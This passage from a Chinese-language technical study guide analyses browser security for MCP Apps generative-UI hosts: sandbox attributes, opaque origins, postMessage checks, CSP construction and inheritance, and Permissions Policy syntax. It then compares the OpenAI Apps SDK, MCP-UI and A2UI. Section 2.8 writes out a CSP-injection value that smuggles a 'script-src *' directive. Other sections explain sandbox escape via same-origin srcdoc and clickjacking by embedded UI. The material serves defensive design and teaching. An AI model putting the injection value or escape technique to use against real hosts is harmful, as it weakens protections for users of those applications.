    if (event.origin !== OWN_ORIGIN) { /* reject */ return; }
    // Use specific origin instead of "*" to prevent message interception.
    window.parent.postMessage(event.data, EXPECTED_HOST_ORIGIN);
  }
});
```
> —— `examples/basic-host/src/sandbox.ts` `[P]`

而 `EXPECTED_HOST_ORIGIN` 来自 `document.referrer`：

> ```ts
> if (!document.referrer) { throw new Error("No referrer, cannot validate embedding site."); }
> const EXPECTED_HOST_ORIGIN = new URL(document.referrer).origin;
> ```
> `[P]`

`[P2]` 这依赖宿主页的 `Referrer-Policy` 至少放出 origin（`no-referrer` 会让代理拒绝启动）。另有一个**自检**："This MUST throw a SecurityError -- if `window.top` is accessible, the sandbox configuration is dangerously broken" `[P]`。

**SDK 默认 transport 的校验方式**——只校验 `event.source`，不校验 `event.origin`，发送用 `"*"`：

> "The `eventSource` parameter is required and validates the message source window by checking `event.source`."
> ```ts
> if (eventSource && event.source !== this.eventSource) { console.debug("Ignoring message from unknown source", event); return; }
> ```
> "Messages are sent using `postMessage` with `"*"` origin, meaning they are visible to all frames. The receiver should validate the message source for security."
> ```ts
> this.eventTarget.postMessage(message, "*");
> ```
> —— `src/message-transport.ts` `[P]`

三个要点：
1. **为什么不校验 origin**：View 侧父窗口（代理）的 origin 预先不知道；宿主侧不透明源 View 的 `event.origin` 全是 `"null"`，区分不了两个 View——窗口引用 `event.source === iframe.contentWindow` 才是能区分的身份。`[P2]`
2. **`eventSource && ...` 是 fail-open**：传 `null`/`undefined` 时整个校验被跳过。注释说它 "required"，代码却在缺失时放行一切来源。`[P]`
3. **`"*"` 发送**：消息对 `eventTarget` 当前文档可见；若 View 把自身 iframe 导航到别的源，宿主后续 `postMessage(msg, "*")` 会把工具结果发给新文档。`[P2]` 更稳的是对代理用**具体 origin**（源已知），即 basic-host 上行方向的做法。

### 2.8 CSP 声明：规范自己的两段示例互相矛盾

`_meta.ui.csp` 四个字段：`connectDomains`（→`connect-src`）、`resourceDomains`（→`img/script/style/font/media-src`）、`frameDomains`（→`frame-src`）、`baseUriDomains`（→`base-uri`）。宿主义务：

> "- **CSP Enforcement:** Host MUST construct CSP headers based on declared domains
> - **Restrictive Default:** If `ui.csp` is omitted, Host MUST use:
>   ```
>   default-src 'none';
>   script-src 'self' 'unsafe-inline';
>   style-src 'self' 'unsafe-inline';
>   img-src 'self' data:;
>   media-src 'self' data:;
>   connect-src 'none';
>   ```
> - **No Loosening:** Host MAY further restrict but MUST NOT allow undeclared domains" `[P]`

而同一份规范的 Security 节给的构造代码是：

```ts
const cspValue = `
  default-src 'none';
  script-src 'self' 'unsafe-inline' ${csp?.resourceDomains?.join(' ') || ''};
  ...
  connect-src 'self' ${csp?.connectDomains?.join(' ') || ''};
  ...
  frame-src ${csp?.frameDomains?.join(' ') || "'none'"};
  object-src 'none';
  base-uri ${csp?.baseUriDomains?.join(' ') || "'self'"};
`;
```
> —— Security Implications §4 `[P]`

**csp 省略时，前者是 `connect-src 'none'`，后者是 `connect-src 'self'`。** 两段都在稳定版规范里。`[P]` 而官方 basic-host 的 `buildCspHeader` 比两者都宽得多：

```ts
"default-src 'self' 'unsafe-inline'",
`script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: data: ${resourceDomains}`.trim(),
...
`connect-src 'self' ${connectDomains}`.trim(),
`worker-src 'self' blob: ${resourceDomains}`.trim(),
...
baseUriDomains ? `base-uri ${baseUriDomains}` : "base-uri 'none'",
```
> —— `examples/basic-host/serve.ts` `[P]`

（`'unsafe-eval'`、`script-src data:`、`blob:` 都不在规范的 restrictive default 里；`base-uri` 的回退值规范说 `'self'`、basic-host 用 `'none'`。）

`'self'` 在这里到底指什么，取决于 View 文档的 origin（专用子域 / 代理源 / 不透明源），这又回到 2.7。第 3 节讨论 CSP 对 srcdoc 的继承和 `'self'` 在不透明源下的含义。

**CSP 注入**：`connectDomains` 是 server 提供的字符串数组，被宿主**拼进** CSP 头。规范示例代码直接 `join(' ')`，没有任何校验。basic-host 自己加了一道：

> ```ts
> // Validate CSP domain entries to prevent injection attacks.
> // Rejects entries containing characters that could:
> // - `;` or newlines: break out to new CSP directive
> // - quotes: inject CSP keywords like 'unsafe-eval'
> // - space: inject multiple sources in one entry
> function sanitizeCspDomains(domains?: string[]): string[] {
>   if (!domains) return [];
>   return domains.filter((d) => typeof d === "string" && !/[;\r\n'" ]/.test(d));
> }
> ```
> —— `examples/basic-host/serve.ts` `[P]`

一个恶意 server 声明 `connectDomains: ["https://ok.test; script-src *"]`，照规范示例拼接就是一个**被 server 自己放宽的 CSP**——直接违反 "No Loosening"。这条非常适合做成纯函数断言（lab：`build_csp` 必须拒绝含 `;`、引号、空白、逗号的条目；还应拒绝 `*`、`'unsafe-*'`、`data:`、`http:` 这类「一个条目放开一大片」的值）。

`[P2]` 还有一个规范没说的细节：`connectDomains: ["https://*.example.com"]` 的通配写法规范只在 `resourceDomains` 的注释里说了 "Wildcard subdomains supported"。宿主若对所有字段都放行通配，等于让 server 用一个条目覆盖任意子域，这对「审计」不友好。

### 2.9 权限（Permissions Policy）：规范示例的 `allow` 拼法是错的

> "Sandbox permissions requested by the UI … Hosts MAY honor these by setting appropriate iframe `allow` attributes. Apps SHOULD NOT assume permissions are granted; use JS feature detection as fallback." `[P]`

规范 Security 节示例：

```ts
const allowList: string[] = [];
if (permissions?.camera) allowList.push('camera');
if (permissions?.microphone) allowList.push('microphone');
if (permissions?.geolocation) allowList.push('geolocation');
const allowAttribute = allowList.join(' ');
```
> `[P]`

SDK 的实现：

```ts
if (permissions.clipboardWrite) allowList.push("clipboard-write");
return allowList.join("; ");
```
> "// Returns: "microphone; clipboard-write""
> —— `src/app-bridge.ts` `buildAllowAttribute`，第 184–201 行 `[P]`

**两处差异：分隔符（空格 vs `; `），以及规范示例漏了 `clipboard-write`。** iframe `allow` 属性的语法由 W3C Permissions Policy 定义，指令之间用 `;` 分隔，指令内部「特性名 + 空格 + allowlist」。所以 `allow="camera microphone"` 会被解析成**一条**指令：特性 `camera`，allowlist 是一个叫 `microphone` 的（无效）源——结果是摄像头和麦克风**都没开**。规范引文与本地实测见第 3 节和第 10 节。

### 2.10 draft 相对稳定版多了什么（不进 L16x 的主线，但要知道）

`diff specification/2026-01-26/apps.mdx specification/draft/apps.mdx` 的主要差异 `[P]`：

- **`_meta.ui` 的位置**：draft 新增「Metadata Location」，`resources/list` 条目和 `resources/read` 内容项都可以带，"the content-item value takes precedence. Hosts MUST check both locations"。
- **CSP 默认**新增 `object-src 'none';`。
- **双向 `tools/call` / `tools/list`**："Host → App: Host calls app-registered tools (requires app `tools` capability)"——View 也能注册工具让宿主（模型）调用，这就和 AG-UI 的「前端工具」汇合了。
- **`sampling/createMessage`**：View 可以请宿主跑一次 LLM 补全，"The host has full discretion over model selection and SHOULD apply rate limiting, cost controls, and user approval"。
- **`ui/download-file`**。
- `hostCapabilities.updateModelContext / message` 带上了模态声明。

`[P2]` 方向判断：draft 在把 View 从「被动展示 + 偶尔调工具」推向「一个完整的 MCP 参与者」（能被调用、能调模型）。这会让第 8 节的威胁面变大，课上提一句即可。

### 2.11 SDK 结构：三个入口对应三个角色

`package.json` 的 `exports` `[P]`：

| 入口 | 给谁 | 关键 API |
|---|---|---|
| `@modelcontextprotocol/ext-apps`（`./app`） | View 作者 | `App`、`app.connect()`（默认 `new PostMessageTransport(window.parent, window.parent)`）、`callServerTool`、`readServerResource`、`app.registerTool` |
| `./react` | View 作者 | `useApp`、`useAutoResize`、`useDocumentTheme`、`useHostStyles`（`src/react/index.tsx` 的 `export *`） |
| `./app-bridge` | 宿主作者 | `AppBridge`、`PostMessageTransport`、`buildAllowAttribute`、`getToolUiResourceUri`、`isToolVisibilityAppOnly/ModelOnly`、`on*` setters（`oncalltool`/`onmessage`/`onopenlink`/`onupdatemodelcontext`/`onsizechange`/…） |
| `./server` | MCP server 作者 | `registerAppTool`、`registerAppResource`、`getUiCapability`、`RESOURCE_MIME_TYPE`、`EXTENSION_ID = "io.modelcontextprotocol/ui"` |
| `./app-with-deps`、`./react-with-deps` | CDN 直接引 | 打包了 client/core/zod，"about 25% larger than the 1.x bundles" |

2.x 的破坏性变化全部在依赖面：`@modelcontextprotocol/sdk@^1` → 拆分的 `@modelcontextprotocol/client|server|core|node|express@^2`，zod 3 被移除，`extra.signal` → `extra.mcpReq.signal`。`[P]`

**课上值得点一句的工程事实**：`App.connect()` 默认 transport 的两个参数都是 `window.parent`（第 2002–2005 行）。在双层代理架构下，View 的 `window.parent` 是**代理**，不是宿主——View 永远不直接和宿主说话。`[P]`

## 3. 浏览器安全原语：sandbox、不透明源、postMessage、CSP

> 这一节只收**规范原文**，而且只收「熟练前端会以为自己知道、但在生成式 UI 的组合里会错」的那部分。来源全部访问于 2026-10-12：
> - WHATWG HTML Standard（Living Standard），`html.spec.whatwg.org/multipage/iframe-embed-object.html`、`browsers.html`、`web-messaging.html`、`browsing-the-web.html`
> - W3C CSP Level 3 Editor's Draft，`w3c.github.io/webappsec-csp/`
> - W3C Permissions Policy Editor's Draft，`w3c.github.io/webappsec-permissions-policy/`

### 3.1 「`allow-scripts` + `allow-same-origin` 等于没沙箱」——前提是同源

WHATWG 原文：

> "Setting both the allow-scripts and allow-same-origin keywords together **when the embedded page has the same origin as the page containing the iframe** allows the embedded page to simply remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether."
> —— WHATWG HTML, *4.8.5 The iframe element*（`sandbox` 属性）`[P]`

这句话流传时几乎总是被删掉中间那个从句。完整含义有两半：

1. **被嵌入页与嵌入页同源时**，这个组合 = 没有沙箱（能删属性、能重载、能摸父页面 DOM）。
2. **不同源时**，这个组合的含义只是「让它保留自己真实的 origin，可以用自己的 cookie/storage」——它仍然摸不到父页面，因为同源策略挡着。

`allow-same-origin` 的定义本身：

> "The allow-same-origin keyword causes the content to be treated as being from its real origin instead of forcing it into an opaque origin" `[P]`

**生成式 UI 里的陷阱在于「真实 origin」对 srcdoc 意味着什么。** `srcdoc` 和 `about:blank` 文档的 origin 是**继承**来的：

> "If url matches about:blank or is about:srcdoc: Set documentState's origin to initiatorOriginSnapshot."
> —— WHATWG HTML, *7.4.2.2 Beginning navigation* `[P]`

所以：**宿主直接把第三方 HTML 写进 `<iframe srcdoc=... sandbox="allow-scripts allow-same-origin">`，View 就和宿主同源**——正好落在上面那句警告的前提里，一步逃逸。这就是 MCP Apps 规范要求 Web 宿主用**不同源的**沙箱代理的原因（2.7），也是它的第 2 条 MUST（代理要 `allow-scripts allow-same-origin`）只有和第 1 条 MUST（代理与宿主不同源）一起读才成立的原因。`[P2]`

第二个常被忽视的细节——**改 sandbox 属性不影响已经加载的文档**：

> "These flags only take effect when the content navigable of the iframe element is navigated. Removing them, or removing the entire sandbox attribute, has no effect on an already-loaded page." `[P]`

这有两个方向的后果：
- 逃逸者删掉 `sandbox` 属性后**必须重载自己**才生效（所以警告里写 "and then reload itself"）。
- **防守方在加载之后再收紧 sandbox 也无效。** basic-host 的代理在收到 `sandbox-resource-ready` 时才 `inner.setAttribute("sandbox", sandbox)`，然后用 `document.write` 写入 HTML。`document.open/write` 不是一次导航——内层那个 `about:blank` 文档的沙箱标志在 iframe **插入 DOM 时**就定了（`allow-scripts allow-same-origin allow-forms`）。`[P2]` 推论：宿主通过 `sandbox-resource-ready.params.sandbox` 下发的「更严格的 sandbox」，在 document.write 路径上**不会生效**；只有回退到 `srcdoc` 那条路径（会触发导航）才会生效。第 10 节实测。

### 3.2 不透明源序列化成字符串 `"null"`，而且所有不透明源都是同一个字符串

> "The serialization of an origin is the string obtained by applying the following algorithm to the given origin origin: If origin is an opaque origin, then return "null"."
> —— WHATWG HTML, *7.1.1 Origins* `[P]`

> "When the attribute is set, the content is treated as being from a unique opaque origin" `[P]`

两个事实拼在一起：每个沙箱 iframe 有一个**唯一的**不透明源，但它们**序列化之后都是 `"null"`**。所以在 `message` 事件里：

- `event.origin === "null"` 不能区分「我的 View A」「我的 View B」「别人页面里的某个沙箱 iframe」「一个 `data:` URL 的窗口」。
- **把 `"null"` 加进 origin 白名单 = 接受任何不透明源的消息。** 这是一个非常自然的修法：开发时发现 origin 是 `"null"`，校验总失败，于是把 `"null"` 加进允许列表——从此任何能拿到你窗口引用的沙箱页面都能给你的桥发 JSON-RPC。`[P2]`

正确的身份是**窗口引用**：`event.source === iframe.contentWindow`。这正是 ext-apps 的 `PostMessageTransport` 选择只校验 `event.source` 的原因（2.7）。而在 origin 已知的那一跳（宿主↔代理，代理有真实的源），**两个都要校验**——basic-host 的代理就是 source + origin 双校验。

### 3.3 postMessage：规范说「检查 origin」，生成式 UI 里要「检查 source + origin + 形状」

WHATWG 的作者须知：

> "Authors should check the origin attribute to ensure that messages are only accepted from domains that they expect to receive messages from. Otherwise, bugs in the author's message handling code could be exploited by hostile sites."
> "Furthermore, even after checking the origin attribute, authors should also check that the data in question is of the expected format. Otherwise, if the source of the event has been attacked using a cross-site scripting flaw, further unchecked processing of information sent using the postMessage() method could result in the attack being propagated into the receiver."
> "Authors should not use the wildcard keyword (*) in the targetOrigin argument in messages that contain any confidential information, as otherwise there is no way to guarantee that the message is only delivered to the recipient to which it was intended."
> "Authors who accept messages from any origin are encouraged to consider the risks of a denial-of-service attack. … Authors are encouraged to employ rate limiting"
> —— WHATWG HTML, *9.3.2.1 Security: Authors* `[P]`

以及 `targetOrigin` 的默认值：

> "If not provided, it defaults to "/". This default restricts the message to same-origin targets only. If the origin of the target window doesn't match the given target origin, the message is discarded, to avoid information leakage. To send the message to the target regardless of origin, set the target origin to "*"." `[P]`

和一句在 iframe 桥里很要命的话：

> "When posting a message to a Window of a browsing context that has just been navigated to a new Document is likely to result in the message not receiving its intended recipient" `[P]`

把这四条放进 MCP Apps 的语境 `[P2]`：

| 规范建议 | 在 MCP Apps 里能不能照做 | 实际做法 |
|---|---|---|
| 检查 `origin` | 对不透明源的 View **做不到**（都是 `"null"`） | 校验 `source` 窗口引用；对有真实源的代理一跳再加 origin |
| 检查数据形状 | 能，而且必须 | JSON-RPC schema + **方法白名单**（第 11 节 TODO 1） |
| 敏感消息别用 `*` | 发给不透明源 View **只能用 `*`**（不透明源无法作为 targetOrigin 表达） | 让敏感数据少进 View；发给代理时用具体 origin |
| 限流 | 规范没给数字 | 宿主对 View 发起的 `tools/call`、`ui/message` 限频（数字无一手来源） |

「发给不透明源只能用 `*`」这一条值得解释一句：`targetOrigin` 要么是 `"*"`、要么是 `"/"`、要么是一个能解析出 origin 的 URL；不透明源没有可写出来的 URL 形式，`"null"` 不是合法的 targetOrigin。`[P2]`（我没在规范里找到一句逐字的「opaque origin 不能作为 targetOrigin」，这是从 targetOrigin 的解析步骤推出来的，第 10 节实测。）

### 3.4 CSP 对 srcdoc / about:blank：**继承**，而且是快照

HTML 规范的策略容器选择算法：

> "If responseURL is about:srcdoc: Assert: parentPolicyContainer is not null. Return a clone of parentPolicyContainer."
> —— WHATWG HTML, *determine navigation params policy container* `[P]`

CSP3 的解释（这段是本节最该给学员读的一段原文）：

> "documents loaded from local schemes will inherit a copy of the policies in the source document. The goal is to ensure that a page can't bypass its policy by embedding a frame or opening a new window containing content that is entirely under its control (srcdoc documents, blob: or data: URLs, about:blank documents that can be manipulated via document.write(), etc). If this would not happen a page could execute inline scripts even without unsafe-inline in the page's execution context by simply embedding a srcdoc iframe."
> "Note that we create a copy of the CSP list which means that the new Document's CSP list is a snapshot of the relevant policies at its creation time."
> —— W3C CSP3, *Policy container integration* `[P]`

推论 `[P2]`：

1. **srcdoc 的 View 自动受宿主（或代理）页面 CSP 约束。** 这就是 basic-host 把 CSP 放在**代理页的 HTTP 响应头**上的原因——代理 HTML 里写着：

   > "<!-- CSP is set via HTTP headers by serve.ts (based on ?csp= query param). The inner iframe inherits this CSP since we use document.write(). -->"
   > —— `examples/basic-host/sandbox.html` `[P]`

2. **每个 View 要不同的 CSP，就需要每个 View 一个代理文档**（basic-host 用 `?csp=` 查询参数让每次加载都返回不同的响应头，并且 `Cache-Control: no-store`）。宿主若复用一个代理页加载多个 View，它们共享**同一份**快照 CSP。
3. **View 能不能自己放宽？不能。** 多条策略是同时生效的（CSP3：「A policy specified via a meta element will be enforced along with」其他策略），View 自己写一条 `<meta http-equiv="Content-Security-Policy">` 只能**再收紧**。
4. **宿主想往 View 里注入 `<meta>` CSP 来「每 View 定制」，有两个坑**：

   > "Neither are the report-uri, frame-ancestors, and sandbox directives." （不支持在 meta 里）
   > "Authors are strongly encouraged to place meta elements as early in the document as possible, because policies in meta elements are not applied to content which precedes them." `[P]`

   第三方 HTML 若在你注入的 `<meta>` 之前就有 `<script>` 或 `<link rel=preload>`，那部分**不受约束**。所以注入式 CSP 必须插在文档最前面，而且宿主得自己解析 HTML 确认这一点——比 HTTP 头脆弱得多。

5. **`'self'` 在不透明源里指什么**——CSP3 专门为此加了一个 `self-origin`：

   > "A CSP list is a struct consisting of policies (a list of policies) and a self-origin (an origin which is used when matching the 'self' keyword). Note: This is needed to facilitate the 'self' checks of local scheme documents/workers that have inherited their policy but have an opaque origin." `[P]`

   也就是说继承来的策略里的 `'self'` 指的是**策略来源文档**（代理页 / 宿主页）的源，不是 View 自己（View 是不透明源，没有可比较的「自己」）。所以规范示例里 `connect-src 'self'` 对一个 srcdoc View 意味着「可以请求**代理域**」——如果代理域上还挂着别的端点（basic-host 的代理服务器上只有 `sandbox.html`，其他路径 404，这是刻意的），`'self'` 就是一个没人注意到的出口。`[P2]`

### 3.5 Permissions Policy：`allow` 属性用分号分隔

> "serialized-permissions-policy = serialized-policy-directive *(";" serialized-policy-directive)
> serialized-policy-directive = feature-identifier RWS allow-list"
> —— W3C Permissions Policy, *5.1 HTML attribute serialization* `[P]`

规范自己的例子：

> `<iframe allow="camera https://app1.site.com https://app3.site.com; microphone https://app2.site.com https://app3.site.com" src="https://doc1.site.com" sandbox="allow-same-origin allow-scripts">` `[P]`

所以 MCP Apps 规范示例的 `allowList.join(' ')`（2.9）产出的 `allow="camera microphone geolocation"` 被解析为**一条**指令：特性 `camera`，allowlist = `microphone geolocation`（被当作两个 host-source）。结果：摄像头只对名叫 `microphone`/`geolocation` 的主机开放（即对谁都不开），麦克风和定位**没有委派**。SDK 的 `join("; ")` 是对的。`[P2]`（推导；第 10 节在 Chromium 里实测。）

同一份规范里还有一句直接适用于「宿主嵌第三方 UI」的警告：

> "JSPlaygroundCorp should avoid iframing user-generated web applications using the allow attribute from its own domain in this case, as this would grant its domain permissions to all of them." `[P]`

以及默认值：

> "Camera and microphone are disabled by default in all cross-origin frames." `[P]`

**前端直觉会走错的一点**：`sandbox` 和 `allow` 是两套**正交**的机制。`sandbox` 管「能不能跑脚本、能不能弹窗、是不是不透明源」；`allow` 管「能不能用摄像头/麦克风/定位/剪贴板」。`sandbox="allow-scripts"` 不会给你摄像头，`allow="camera"` 也不会给你脚本。MCP Apps 的 `_meta.ui.permissions` 映射的是后者，所以规范里那个字段名叫 "Sandbox permissions" 有一点误导。`[P2]`

### 3.6 clickjacking：这次是「被嵌入方攻击嵌入方」

经典 clickjacking 是**恶意页面嵌你**，防御是 `frame-ancestors` / `X-Frame-Options`。生成式 UI 把方向倒过来了：**你嵌恶意内容**。所以：

- `frame-ancestors` **帮不了你**——它是被嵌入方用来保护自己的。而且 CSP3 明说它不能放在 `<meta>` 里（上面的引文），对 srcdoc 就更无从谈起。
- 威胁变成：View 在自己的矩形里画一个**长得像宿主**的东西（假的「允许执行」按钮、假的登录框、假的系统提示），或者通过 `size-changed` 把自己撑大到盖住宿主的真实控件。

MCP Apps 规范对此只有一句：

> "**Social engineering:** UI can still display misleading content. Hosts should clearly indicate sandboxed UI boundaries." `[P]`

OpenAI Apps SDK 的 UX/安全指南有更具体的要求（第 4 节）。`[P2]` 宿主侧能写成断言的只有：尺寸 clamp、View 区域有宿主绘制的边框/来源标签（`prefersBorder` 是 View 的**偏好**，宿主可以不听）、敏感确认 UI 永远由宿主在 iframe **外**绘制。

## 4. OpenAI Apps SDK 与 MCP-UI

### 4.1 OpenAI Apps SDK：已经「以 MCP Apps 为准」

> 一手来源：`developers.openai.com/apps-sdk/reference`、`/apps-sdk/changelog`、`/apps-sdk/guides/security-privacy`、`/apps-sdk/build/mcp-server`、`/apps-sdk/build/chatgpt-ui`，访问 2026-10-12。页面导航里这套文档现在挂在 **"Plugins"** 名下（"Plugin UI reference"、"Plugin UI changelog"），URL 仍是 `/apps-sdk/`。`[P]`

**定位翻转**。OpenAI 的 reference 第一段：

> "Start with the open standard. Use the MCP Apps specification for shared UI fields and bridge methods. OpenAI extensions are optional and live in window.openai when you want ChatGPT-specific capabilities."
> "New UI should use the MCP Apps bridge whenever the shared specification provides an equivalent, then use window.openai only for ChatGPT-specific capabilities." `[P]`

changelog 的关键节点（全部逐字）：

> "2026-02-22 MCP Apps compatibility … ChatGPT is now fully compatible with the MCP Apps spec." `[P]`
> "2026-05-27 MCP Apps tool lifecycle updates … For tools that need user approval, ChatGPT now delivers widget tool input through the MCP Apps ui/notifications/tool-input lifecycle after approval instead of preloading it into the initial widget globals." `[P]`
> "2026-05-28 MCP Apps host style variables … ChatGPT now provides standardized MCP Apps host CSS variables through hostContext.styles.variables during initialization and updates them through ui/notifications/host-context-changed" `[P]`
> "2026-06-12 App permission controls in ChatGPT … ChatGPT users can now choose when connected apps ask for permission: always, before making changes, or only before important changes." `[P]`
> "2026-07-21 Legacy tool visibility metadata deprecated … Deprecated _meta["openai/visibility"] because its private value hides a tool from the model without specifying app visibility, which can make the intended audience unclear. Use _meta.ui.visibility to choose whether a tool is available to the model, the app, or both." `[P]`

**2026-05-27 那条值得单独拎出来**：在那之前，需审批工具的参数会被**预装进 widget 全局变量**——第三方 UI 在用户点「允许」**之前**就拿到了参数。现在改成审批后才经 `ui/notifications/tool-input` 下发（"ChatGPT does not load approval-gated arguments into widget values before approval" `[P]`）。这是 L16「能展示 ≠ 能执行」的第三种形态：**「能交给第三方 UI」也是一道门，且排在审批之后**。MCP Apps 稳定版只说 `tool-input` 在 initialize 之后、**未与审批绑定** `[P]`，所以时机是宿主策略——lab 做成断言：审批未过前出站队列不得出现 `tool-input`。

#### `window.openai` vs MCP Apps bridge：不只是 API 形状的差别

| 维度 | OpenAI `window.openai` | MCP Apps | 来源 |
|---|---|---|---|
| 获取方式 | 宿主注入的全局对象，"Properties pre-populated on load" | `new App()` + `await app.connect()`，"Async connection + notifications" | ext-apps `docs/migrate_from_openai_apps.md` `[P]` |
| 读取 | "Sync property access" | "Getters + event handlers" | 同上 `[P]` |
| MIME | `text/html+skybridge` | `text/html;profile=mcp-app` | 同上 `[P]` |
| 工具→模板 | `_meta["openai/outputTemplate"]` | `_meta.ui.resourceUri` | 同上 `[P]` |
| UI 能否调工具（默认） | `_meta["openai/widgetAccessible"]`，**"default false"** | `visibility` 省略 = `["model","app"]`，**默认能调** | OpenAI reference；MCP Apps 规范 `[P]` |
| 对模型隐藏 | `_meta["openai/visibility"]: "private"`（已弃用） | `visibility` 不含 `"model"` | 同上 `[P]` |
| 持久状态 | `widgetState` / `setWidgetState` | **无**——"Use alternative mechanisms (`localStorage`, server-side state, etc.)" | migrate 文档 `[P]` |
| 文件 | `uploadFile` / `selectFiles` / `getFileDownloadUrl` | 稳定版无（draft 有 `ui/download-file`） | 同上 `[P]` |
| 模态 / 关闭 | `requestModal` / `requestClose` | "Not yet implemented" | migrate 文档 `[P]` |
| 外链 | `openExternal({ href, redirectUrl })`，目标须在 `redirect_domains` | `ui/open-link`，无域名白名单字段 | OpenAI reference `[P]` |
| 默认沙箱域 | `https://web-sandbox.oaiusercontent.com`；`_meta.ui.domain` "required when submitting a plugin with UI; must be unique per plugin" | `domain` 宿主相关，"If omitted, Host uses default sandbox origin (typically per-conversation)" | OpenAI reference；MCP Apps 规范 `[P]` |

**默认值翻转那一行是迁移时最容易出事的地方**：OpenAI 旧字段 `widgetAccessible` 默认 `false`（UI 默认**不能**调工具），MCP Apps 的 `visibility` 默认 `["model","app"]`（UI 默认**能**调）。一个 server 从 `openai/*` 迁到 `_meta.ui`、而没有给每个工具显式写 `visibility`，等于把它所有工具都对自己的 UI 开放了。`[P2]`（两边默认值都是 `[P]`，「迁移导致放宽」是推论。）

#### `structuredContent` 进不进模型上下文：两份一手文档说法相反

MCP Apps 规范：

> "`structuredContent`: Structured data optimized for UI rendering (not added to model context)" `[P]`

OpenAI reference：

> "window.openai.toolOutput — Your structuredContent. Keep fields concise; the model reads them verbatim." `[P]`

OpenAI build 文档：

> "structuredContent : concise data the model can inspect and use in later calls. content : text or other MCP content that helps the model answer the user. _meta : client-specific data hidden from the model." `[P]`

**结论：`structuredContent` 是否进模型上下文是宿主相关的。** 规范那句在 "Best Practices" 下、不是 MUST；ChatGPT 的实际行为是模型逐字读它。两份文档**唯一一致**的是 `_meta`：两边都说对模型隐藏。两个后果 `[P2]`：(1)「放 `structuredContent` 不占模型上下文」在 ChatGPT 上错（占 token）；(2)「不进模型所以不会被注入」也错——**真正对模型不可见的只有 `_meta`**，而 `_meta` 对 View 可见（ChatGPT 的 `toolResponseMetadata` "preserving the full MCP result envelope, including hidden _meta"）。所以 `_meta` 是「给 UI 看、不给模型看」的唯一通道，也是一个模型侧审查覆盖不到、直达第三方代码的数据通道。

#### OpenAI 安全页里四条能直接用的事实

> "Widgets run inside an isolated iframe with a strict Content Security Policy. They cannot access privileged browser APIs such as window.alert , window.prompt , window.confirm , or navigator.clipboard ." `[P]`

> "Nested frames are unavailable by default; enable specific origins in resource CSP metadata such as _meta.ui.csp.frameDomains ." `[P]`

> "**An embedded page uses its own CSP; the widget connectDomains and resourceDomains allowlists do not restrict network requests made inside that page.** Keep iframe origins specific and include the embedded experience in your security review." `[P]`

> "Structured content: Include only the data required for the current prompt. Avoid embedding secrets or tokens in component props." `[P]`

**第三条是本节最重要的 CSP 反转之一**：`frameDomains` 不是「再开一个小口子」，是**把一整个不受 widget CSP 约束的文档放进来**。嵌套 iframe 是正常导航（有自己的响应和 CSP 头），不走 §3.4 的「local scheme 继承」规则。View 若能把数据通过 URL/`postMessage` 交给嵌套页，`connectDomains` 就被绕过。`[P2]` OpenAI 的缓解是**审核**而非技术机制（"A justification is required at submission, and iframe use can require additional review" `[P]`）。

#### OpenAI 推荐的「数据工具 / 渲染工具」分离

> "The model calls the data tool … receives structuredContent … calls the render tool with that data. The widget renders once with final, model-checked context." "Only the render tool should include _meta.ui.resourceUri." "Let the UI call data tools directly for local interactions like 'Re-roll', without remounting the widget." `[P]`

这是 **L16「决策权在模型、渲染权在你」的工程模式**：渲染工具的参数是模型检查过的，View 只负责画；可见性也自然——数据工具 `["model","app"]`，渲染工具 `["model"]`。`[P2]`

### 4.2 MCP-UI：MCP Apps 的前身与「社区游乐场」

MCP Apps 规范对它的定位：

> "[MCP-UI](https://mcpui.dev/) has demonstrated the viability and value of MCP apps built on UI resources and serves as a community playground for the UI spec and SDK. … it developed the bi-directional communication model and the HTML, external URL, and remote DOM content types. MCP-UI's adopters, including hosts and providers such as Postman, HuggingFace, Shopify, Goose, and ElevenLabs" `[P]`

规范列出的与 MCP-UI 的差异：

> "- Handshakes using MCP-like `ui/initialize` / `ui/notifications/initialized` messages instead of `iframe-ready`
> - Capabilities negotiated via `McpUiInitializeResult`
> - Tool data passed via notifications" `[P]`

以及被 MCP Apps **推迟**的 MCP-UI 能力：

> "**Embedded resources:** Current MCP-UI approach, where resources are returned in tool results."
> "**Include external URLs in MVP:** … deferred due to concerns around model visibility, inability to screenshot content, and review process."
> "**Custom message protocol:** Current MCP-UI approach with message types like tool, prompt, etc. These message types can be translated to a subset of the proposed JSON-RPC messages." `[P]`

**当前包（npm pack，2026-10-12）**：`@mcp-ui/client@7.1.1`、`@mcp-ui/server@6.1.0`——仍在活跃发布，且已向 MCP Apps 对齐（client 的 schema 里出现了 `"model"/"app"` 可见性、`text/html;profile=mcp-app` MIME、`McpUiInitializeResult`）。`[P]` 一个对 L16x 学员很有用的对照：**MCP-UI client 默认的内层沙箱是 `"allow-scripts allow-same-origin allow-forms"`**（源码直读）——**带 `allow-same-origin`**。按 §3.1，这只有在「内层与宿主不同源」时才安全；MCP-UI 的历史内容类型里有 `text/html`（srcdoc/rawHtml）与 `text/uri-list`（external URL），rawHtml 走 srcdoc 时继承宿主源，`allow-same-origin` 就危险。这正是 MCP Apps 规范把「代理与宿主必须不同源」提升为 MUST、并改用双层 iframe 的原因（§2.7）。`[P2]`

## 5. A2UI

> 一手来源：`github.com/google/A2UI`（文档里已写成 `github.com/a2ui-project/a2ui`），通过 `raw.githubusercontent.com/google/A2UI/main/...` 读取，访问 2026-10-12：
> - `specification/v1_0/docs/a2ui_protocol.md`（87,449 字节，"**Version:** 1.0 **Status:** Candidate … **Last Updated:** Jun 8, 2026"）
> - `docs/public/specification/v1.0-a2ui.md`："Version 1.0 (previously v0.10 in draft) is currently a release candidate. For production use, consider v0.9.1 (Current)."
> - `specification/v0_9_1/catalogs/basic/catalog.json`、`specification/v0_9_1/json/common_types.json`
> - `docs/public/concepts/actions.md`、`docs/public/guides/{a2ui_over_mcp,mcp-apps-in-a2ui,a2ui-in-mcp-apps}.md`、`docs/public/introduction/{what-is-a2ui,agent-ui-ecosystem}.md`、`docs/public/ecosystem/a2ui-in-the-world.md`
> - `samples/client/shared/mcp_apps_inner_iframe/sandbox.ts`
>
> **版本状态**：稳定版是 **v0.9.1**，v1.0 是候选版。下文引 v1.0 协议文本时都会标出；涉及组件目录的结论用 v0.9.1 的 basic catalog。`[P]`

### 5.1 它是什么：模型输出组件蓝图，客户端用**自己的**组件渲染

> "**A2UI (Agent to UI) is a declarative UI protocol for agent-driven interfaces.** AI agents generate rich, interactive UIs that render natively across platforms (web, mobile, desktop) without executing arbitrary code."
